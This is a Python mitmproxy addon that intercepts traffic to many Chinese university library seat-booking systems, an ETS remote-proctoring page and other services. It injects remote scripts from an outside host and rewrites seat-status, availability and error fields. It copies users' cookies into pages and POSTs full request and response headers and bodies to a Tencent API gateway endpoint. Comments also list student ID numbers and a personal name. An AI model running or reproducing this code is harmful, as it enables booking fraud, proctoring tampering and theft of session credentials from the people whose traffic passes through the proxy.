from mitmproxy import ctx
import re
import http.client
import json,os
import datetime
import ssl
ssl._create_default_https_context = ssl._create_unverified_context

def nextDay(num):
  temp_date = datetime.datetime.now()
  return (temp_date + datetime.timedelta(days=num)).strftime("%Y-%m-%d")

def nextDaySecurity(num):
  if (datetime.datetime.now().hour < 23 or datetime.datetime.now().minute < 59):
    num -= 1
  temp_date = datetime.datetime.now()
  return (temp_date + datetime.timedelta(days=num)).strftime("%Y-%m-%d")

# <script src="https://cdn.bootcdn.net/ajax/libs/vConsole/3.4.0/vconsole.min.js"></script>
# <script>
#     // init vConsole
#     var vConsole = new VConsole();
# </script>

hackList = [
  {
    "url": "clientweb/m/ic2/Default.aspx",
    "hack": [
      [
        '</body>', 
        '''
        <link charset="utf-8" rel="stylesheet" href="https://cunchu.site/work/login/mini.css">
        <link charset="utf-8" rel="stylesheet" href="//cunchu.site/work/login/standard.css">
        <script src="//cunchu.site/work/script/newClient.js" type="text/javascript" charset="UTF-8"></script>
        <script src="//cunchu.site/work/login/mini.js" type="text/javascript" charset="UTF-8"></script>
        </body>
        '''
      ],
    ]
  },
  {
    "url": "https://ibtprod-rp.ets.org/ibt2tcweb/rmproctor",
    "hack": [
      [
        '</body>', 
        '''<script src="https://cdn.bootcdn.net/ajax/libs/vConsole/3.4.0/vconsole.min.js"></script>
 <script>
     // init vConsole
     var vConsole = new VConsole();
 </script></body>'''
      ]
    ]
  },
  {
    "url": "https://ibtprod-rp.ets.org/ibt2tcweb/rmproctor/rmproctor.js",
    "hack": [
      [
        '!data.errorMsg', 
        '''true'''
      ],
      [
        'data.resp && data.resp.regResponse && data.resp.regResponse.appointmentData', 
        '''true'''
      ],
      [
        'data.resp.regResponse.appointmentData', 
        '''{"candidateId":0,"registrationSystemId":0,"packageId":"00000000000","adminCode":0}'''
      ],
    ]
  },
  {
    "url": "https://uwei.dataesb.com/webWechat/SeatBooking/startBookingTwo",
    "hack": [
      [
        'longDay = "0"', 
        'longDay = "1"'
      ],
      [
        '</body>', 
        '''
        <link charset="utf-8" rel="stylesheet" href="https://cunchu.site/work/login/mini.css">
        <link charset="utf-8" rel="stylesheet" href="//cunchu.site/work/login/standard.css">
        <script>window.owoType = '贵州省图书馆'</script>
        <script src="//cunchu.site/work/login/mini.js" type="text/javascript" charset="UTF-8"></script>
        </body>
        '''
      ],
    ]
  },
  {
    "url": "https://uwei.dataesb.com/webWechat/SeatBooking/startBookingThree",
    "hack": [
      [
        '', 
        '请关闭代理!'
      ],
    ]
  },
  # {
  #   "url": ".*/api.php/v3qrtime",
  #   "hack": [
  #     [
  #       '', 
  #       '''{"status":1,"msg":"\\u670d\\u52a1\\u5668\\u65f6\\u95f4","data":49793547986}'''
  #     ],
  #   ]
  # },
  # {
  #   "url": "https://ujnpl.educationgroup.cn/xsgl/stdYy/loadZw",
  #   "hack": [
  #     [
  #       '"src":"1.png"', 
  #       '"src":"0.png"'
  #     ],
  #     [
  #       '"src":"2.png"', 
  #       '"src":"0.png"'
  #     ],
  #   ]
  # },
  # {
  #   "url": "//wxcourse.jxufe.cn/wxlib/wx/data/venueDistributionInfo",
  #   "hack": [
  #     [
  #       '2022-04-09', 
  #       '2022-04-11'
  #     ],
  #   ]
  # },
  # {
  #   "url": "//wxcourse.jxufe.cn/wxlib/wx/data/dateSeatNumStatus",
  #   "hack": [
  #     [
  #       '', 
  #       '''{"code":1,"success":true,"message":"","result":[{"num":1,"start":"08:00","end":"12:00","allSeatNum":34,"noSeat":0},{"num":2,"start":"12:00","end":"17:00","allSeatNum":34,"noSeat":0},{"num":3,"start":"17:00","end":"23:00","allSeatNum":34,"noSeat":28}]}'''
  #     ],
  #   ]
  # },
  # 湖南农业大学
  {
    "url": "//libseat.hunau.edu.cn/mobile/html/seat/seatquickbook.html",
    "hack": [
      [
        '</body>', 
        '''
        <link charset="utf-8" rel="stylesheet" href="//cunchu.site/work/login/mini.css">
        <link charset="utf-8" rel="stylesheet" href="//cunchu.site/work/login/standard.css">
        <script>window.owoType = '湖南农业大学';mui.alert = function () {};</script>
        <script src="//cunchu.site/work/login/mini.js" type="text/javascript" charset="UTF-8"></script>
        <script src="//cunchu.site/work/script/%E6%B9%96%E5%8D%97%E5%86%9C%E4%B8%9A%E5%A4%A7%E5%AD%A6.js"></script>
        </body>'''
      ],
    ]
  },
  # 厦门大学
  {
    "url": "https://lib.xmu.edu.cn/seatwx/",
    "hack": [
      [
        '</body>', 
        '''
        <link charset="utf-8" rel="stylesheet" href="//cunchu.site/work/login/mini.css">
        <link charset="utf-8" rel="stylesheet" href="//cunchu.site/work/login/standard.css">
        
        <script src="https://cunchu.site/work/assist/logPanel.js"></script>
        <script src="//cunchu.site/work/assist/%E5%8E%A6%E9%97%A8%E5%A4%A7%E5%AD%A6/index.js"></script>
        <script>window.owoType = '厦门大学';</script>
        <script src="//cunchu.site/work/login/mini.js" type="text/javascript" charset="UTF-8"></script>
        </body>'''
      ],
    ]
  },
  # 北京理工大学
  {
    "url": "//seat.lib.bit.edu.cn/h5/",
    "hack": [
      [
        '</body>', 
        '''
        <link charset="utf-8" rel="stylesheet" href="//cunchu.site/work/login/mini.css">
        <link charset="utf-8" rel="stylesheet" href="//cunchu.site/work/login/standard.css">
        <script>window.owoType = '北京理工大学';mui.alert = function () {};</script>
        <script src="//cunchu.site/work/login/mini.js" type="text/javascript" charset="UTF-8"></script>
        </body>'''
      ],
    ]
  },
  {
    "url": "//gym.dazuiwl.cn/h5/",
    "hack": [
      [
        '</body>', 
        '''
        <link charset="utf-8" rel="stylesheet" href="//cunchu.site/work/login/mini.css">
        <link charset="utf-8" rel="stylesheet" href="//cunchu.site/work/login/standard.css">
        <script>window.owoType = '北京理工大学场馆';mui.alert = function () {};</script>
        <script src="//cunchu.site/work/login/mini.js" type="text/javascript" charset="UTF-8"></script>
        </body>'''
      ],
    ]
  },
  {
    "url": "//seat.lib.bit.edu.cn/api/Seat/date",
    "calculate": 0
  },
  {
    "url": "//seat.lib.bit.edu.cn/api/Seat/seat",
    "hack": [
      [
        '"status":"2"', 
        '"status":"1"'
      ],
    ]
  },
  {
    "url": "//gym.dazuiwl.cn/api/sport_events/open_times/id",
    "calculate": 1
  },
  # 湖南大学
  {
    "url": "//yrkj.hnu.edu.cn/mobile/html/seat/seatquickbook.html",
    "hack": [
      [
        '</body>', 
        '''
        <link charset="utf-8" rel="stylesheet" href="//cunchu.site/work/login/mini.css">
        <link charset="utf-8" rel="stylesheet" href="//cunchu.site/work/login/standard.css">
        <script>window.owoType = '湖南大学';mui.alert = function () {};</script>
        <script src="//cunchu.site/work/login/mini.js" type="text/javascript" charset="UTF-8"></script>
        <script src="//cunchu.site/work/script/%E6%B9%96%E5%8D%97%E5%86%9C%E4%B8%9A%E5%A4%A7%E5%AD%A6.js"></script>
        </body>'''
      ],
    ]
  },
  {
    "url": "https://chaxin.hnu.edu.cn/mobile/html/seat/book_nav.html",
    "hack": [
      [
        '</body>', 
        '<link charset="utf-8" rel="stylesheet" href="//cunchu.site/work/login/mini.css"><link charset="utf-8" rel="stylesheet" href="//cunchu.site/work/login/standard.css"><script>window.owoType = "湖南工商大学";alert("现在可以关闭代理了,否则影响速度!");</script><script src="https://cunchu.site/work/assist/logPanel.js"></script><script src="//cunchu.site/work/debug/js/%E6%B9%96%E5%8D%97%E5%B7%A5%E5%95%86.js"></script></body>'
      ],
    ]
  },
  {
    "url": "http://chaxin.hnu.edu.cn/mobile/html/seat/book_nav.html",
    "hack": [
      [
        '</body>', 
        '<link charset="utf-8" rel="stylesheet" href="//cunchu.site/work/login/mini.css"><link charset="utf-8" rel="stylesheet" href="//cunchu.site/work/login/standard.css"><script>window.owoType = "湖南工商大学";alert("现在可以关闭代理了,否则影响速度!");</script><script src="https://cunchu.site/work/assist/logPanel.js"></script><script src="//cunchu.site/work/debug/js/%E6%B9%96%E5%8D%97%E5%B7%A5%E5%95%86.js"></script></body>'
      ],
    ]
  },
  # 湖南工商大学
  {
    "url": "//libseat.hutb.edu.cn/mobile/html/seat/seatbook.html",
    "hack": [
      [
        '</body>', 
        '<link charset="utf-8" rel="stylesheet" href="//cunchu.site/work/login/mini.css"><link charset="utf-8" rel="stylesheet" href="//cunchu.site/work/login/standard.css"><script>window.owoType = "湖南工商大学";alert("现在可以关闭代理了,否则影响速度!");</script><script src="https://cunchu.site/work/assist/logPanel.js"></script><script src="//cunchu.site/work/debug/js/%E6%B9%96%E5%8D%97%E5%B7%A5%E5%95%86.js"></script></body>'
      ],
    ]
  },
  {
    "url": "https://libseat.hutb.edu.cn/mobile/html/seat/seatquickbook.html",
    "hack": [
      [
        '</body>', 
        '</body><script>window.alert=function () {}</script>'
      ],
    ]
  },
  # {
  #   "url": "https://dappweb-api.huolala.cn/index.php",
  #   "hack": [
  #     [
  #       '"disable":1', 
  #       '"disable":0'
  #     ],
  #   ]
  # },
  {
    "url": "https://libapp.heuet.edu.cn:82/Seat/BespeakSeat/BespeakChoice.aspx",
    "hack": [
      [
        'window.location.href = "../Menu.aspx";', 
        ''
      ],
    ]
  },
  # 2023-10-21
  {
    "url": "https://assist.yqgx123.com/api/getBookingTimes",
    "hack": [
      [
        '2023-04-22', 
        '2023-04-23'
      ],
      [
        '"bookingStatus":3', 
        '"bookingStatus":null'
      ],
      [
        '"该时间段尚未开放预约"', 
        'null'
      ],
      [
        '"isChecked":false', 
        '"isChecked":true'
      ],
    ]
  },
  {
    "url": "/js/0.25bd6725cdaf9eadf670.js",
    "hack": [
      [
        'Global.NUMCODE);',
        'Global.NUMCODE);alert(o);'
      ],
    ]
  },
  {
    "url": "http://libreserve.nuist.edu.cn/seat/rest/RoomArea/r/roomInfo",
    "hack": [
      [
        '"ISFULL":"1"',
        '"ISFULL":"0"'
      ],
    ]
  },
  {
    "url": "http://libreserve.nuist.edu.cn/seat/rest/RoomArea/r/yyList",
    "hack": [
      [
        '"COUNT":0',
        '"COUNT":10'
      ],
    ]
  },
  {
    "url": "/rest/RoomArea/r/seatDetail",
    "hack": [
      [
        '"STATE":"2"',
        '"STATE":"0"'
      ],
    ]
  },
  {
    "url": "xcx.yqgz.beijing.gov.cn",
    "hack": [
      [
        '"code":"3"', 
        '"code":"0"'
      ],
      [
        'puCOrpWfPa6hiRTBDD60MQ==', 
        'Ivl7cBko+tfg2m7bk2C7Ww=='
      ],
    ]
  },
  {
    "url": "https://mob.my.jj.cn/api_ci/bill/mey",
    "redirect": "taobao/谭亚军920718.json"
  },
  # 座位预约App
  # 2019211083 2019213830 2019214036 9月末
  # 2019213184 10月8号
  # 2019214001 10月14
  # 2019212413 10月21
  # 2017211670 2019211084 2019210674 2019212193 10月19
  # 2019211259 10月23
  # 2019211065  10月初
  # 2019210762 2020210604 2019211060 2019211375 11月12
  # 2019211028 11月14日
  # 2019211012 11月18日
  # 2019211049 11月19日
  # 2019211059 11月23
  # 2019214066 11月24
  # 2019211395 11月25
  # 2019211121 11月27
  # 2019211144 12月3
  # 2019211791 （2019211306 2020211277）年底
  # 2019211120 2019212381 2019214204 2019210987 2019211324 2019211115 2月初
  {
    "url": ".*//zwyy-lib.chzu.edu.cn:9091/tsgintf/main/service|.*//220.180.184.9:9091/tsgintf/main/service",
    "hack": [
      [
        '''<script type="text/javascript">''', 
        '''<script type="text/javascript">
        
        api.showProgress = function (e) {console.log(e);checkSubmitFlg = false;}
        let allowList = []
        if (allowList.includes(_key)) {
          alert('载入成功，现在关闭代理功能也可以使用功能，并获得更快速度。点击座位即可完成原来长按确认的操作，开抢前几秒一直点击基本可以预约到座位。')
          document.querySelector('#randomBtn').outerHTML = `<div class="aui-btn aui-btn-info aui-margin-t-10" onclick="suiji()">随机分配</div>`
          setTimeout(() => {
              document.querySelectorAll('.seatFont').forEach(element => {
                
                element.onclick = function (e) {
                  
                  var sate = e.target.getAttribute("hid")
                  doPreSeat(sate, roomId,GetDateStr(0), _key, startHour,endHour,'0')
                }
            });
          }, 100);
        } else {
          alert('未授权用户: ' + _key)
        }
        function randomNum(minNum,maxNum){ 
          switch(arguments.length){ 
            case 1: 
              return parseInt(Math.random()*minNum+1,10); 
              break; 
            case 2: 
              return parseInt(Math.random()*(maxNum-minNum+1)+minNum,10); 
              break; 
            default: 
              return 0; 
              break; 
          } 
        } 
        function suiji () {
          var list = document.querySelectorAll('.seatFont')
          ele = list[randomNum(0, list.length - 1)]
          var sate = ele.getAttribute("hid")
          // alert(sate)
          doPreSeat(sate, roomId,GetDateStr(0), _key, startHour,endHour,'0')
        }
function GetDateStr(AddDayCount) {
    var dd = new Date();
    dd.setDate(dd.getDate()+AddDayCount);//获取AddDayCount天后的日期
    var y = dd.getFullYear();
    var m = dd.getMonth()+1;//获取当前月份的日期
    var d = dd.getDate() + 1;
    return y+"-"+m+"-"+d;
}

'''
      ],
    ]
  },
  # 医院预约
  # {
  #   "url": ".*//wx.whyyy.com/MicroSY/reservegh",
  #   "hack": [
  #     [
  #       '"status":"2"', 
  #       '"status":"7"'
  #     ],
  #     [
  #       '"status":"6"', 
  #       '"status":"7"'
  #     ],
  #     [
  #       '"regFlag":-1', 
  #       '"regFlag":1'
  #     ]
  #   ],
  # },


  # 山东财经
  # {
  #   "url": ".*//libst.sdufe.edu.cn/|.*//lxl.sdyu.edu.cn/|.*//www.skalibrary.net|.*/seat.lib.sdu.edu.cn",
  #   "hack": [
  #     [
  #       '</body>', 
  #       '''
  #       <script src="http://cunchu.site/work/assist/owoHackUrl.js"></script>
  #       <link charset="utf-8" rel="stylesheet" href="https://cunchu.site/work/login/mini.css">
  #       <script src="https://cunchu.site/work/assist/logPanel.js"></script>
  #       <script src="https://cunchu.site/work/debug/js/sdcj.js"></script>
        
  #       <script src="https://cunchu.site/work/login/mini.js" type="text/javascript" charset="UTF-8"></script>
  #       <script>
  #           window.owoHackUrlSend = {
  #             "api.php/spaces": function (e, myUrl) {
  #                 console.log(e, myUrl)
  #                 if (e.indexOf('access_token') >= 0 && document.querySelector('.owo textarea')) {
  #                   document.querySelector('.owo .send-url').value += myUrl + '@'
  #                   document.querySelector('.owo textarea').value += e + '@'
  #                 }
  #             }
  #           }
  #       </script>
  #       </body>
  #       '''
  #     ]
  #   ],
  # },

]

reqHackList = [
  # 座位预约
  # ".*//211.70.171.14:9999/tsgintf/main/service",
  # ".*//zwyy-lib.chzu.edu.cn:9091/tsgintf/main/service"
  "http://sw.xianmaigu.com/api/YySeatAppointment/addes.html",
  "https://tsg77.sdust.edu.cn/Base/QueryNotice",
  "https://wx.xianmaigu.com/scwgy_seat/api/seatAppointment/seaAappointment.html",
  "https://slg.xianmaigu.com/api/seatAppointment/seaAappointment.html",
  "https://prod.zixishi.tech/srapi/app/member/supplier-or-merchant-info/v1/2/211",
  "https://uwei.dataesb.com/webWechat/SeatBooking/submitBooking",
  "https://uwei.dataesb.com/webWechat/SeatBooking/initSeat",
  # "dappweb-api.huolala.cn/index.php"
]

repHackList = [
  'https://mobiles.zhicall.cn/mobile-web/mobile/patient/get/familyMembers/'
]


class ModifyResponse:

  def response(self,flow):
    for item in hackList:
      if ('url' in item and flow.request.url):
        findList = pattern = re.compile(item['url']).findall(flow.request.url)
        if (len(findList) > 0):
          # ctx.log.info('请求被重写:' + flow.request.url)
          # flow.response.headers['Expires'] = 0
          flow.response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate'
          flow.response.headers['Pragma'] = 'no-cache'
          returnText = flow.response.text
          # print(returnText)
          if ('</body>' in returnText):
            returnText = returnText.replace('</body>', '''<div id="resCookie" style="display: none;">%s</div>\r\n<script>var resCookie = '%s';var resReferer = '%s'</script>\r\n</body>''' % (flow.request.headers.get('cookie'), flow.request.headers.get('cookie'), flow.request.headers.get('referer')))
          if ('hack' in item):
            for value in item['hack']:
              if (value[0] != ""):
                returnText = returnText.replace(value[0], value[1])
              else:
                returnText = value[1]
          if ('calculate' in item):
            if (item['calculate'] == 0):
              temp = json.loads(returnText)
              temp['data'][1]["times"][0]["id"] = int(temp['data'][1]["times"][0]["id"]) + 1
              returnText = json.dumps(temp)
            if (item['calculate'] == 1):
              temp = json.loads(returnText)
              temp['data'] = temp['data'] + 1
              returnText = json.dumps(temp)
          if ("redirect" in item):
            if (item["redirect"] != ''):
              conn = http.client.HTTPSConnection("cos.cunchu.site")
              payload = json.dumps({
                "path": item["redirect"]
              })
              headers = {
                'Content-Type': 'application/json'
              }
              conn.request("POST", "/read", payload, headers)
              res = conn.getresponse()
              data = res.read()
              returnText = data.decode("utf-8")
          flow.response.set_text(returnText)
    for item in repHackList:
      findList = pattern = re.compile(item).findall(flow.request.url)
      if (len(findList) > 0):
        headersTemp = {}
        for item in flow.response.headers:
          headersTemp[item] = flow.response.headers[item]
        conn = http.client.HTTPSConnection("service-g9parw23-1256763111.bj.apigw.tencentcs.com")
        # flow.request.text = 'asd'
        conn.request("POST", "/release/redirect", json.dumps({
          "url": flow.request.url,
          "host": flow.request.host,
          "headers": headersTemp,
          "data": flow.response.text
        }), {
          'Content-Type': 'application/json',
        })
        res = conn.getresponse()
        data = res.read()
  def request(self, flow):
    if (flow.request.url):
      for item in reqHackList:
        findList = pattern = re.compile(item).findall(flow.request.url)
        if (len(findList) > 0):
          # print(flow.request.headers)
          # flow.request.headers['owoHost'] = flow.request.host
          # flow.request.headers['owoPath'] = flow.request.path
          # flow.request.path = "/redirect"
          # flow.request.host = "hanshu.run"
          # flow.request.port = 80
          # flow.request.scheme = 'http'
          headersTemp = {}
          for item in flow.request.headers:
            headersTemp[item] = flow.request.headers[item]
          conn = http.client.HTTPSConnection("service-g9parw23-1256763111.bj.apigw.tencentcs.com")
          # flow.request.text = 'asd'
          conn.request("POST", "/release/redirect", json.dumps({
            "url": flow.request.url,
            "path": flow.request.path,
            "host": flow.request.host,
            "port": flow.request.port,
            "scheme": flow.request.scheme,
            "headers": headersTemp,
            "data": flow.request.text
          }), {
            'Content-Type': 'application/json',
          })
          res = conn.getresponse()
          data = res.read()
          # print(data.decode("utf-8"))
        
addons = [
  ModifyResponse()
]
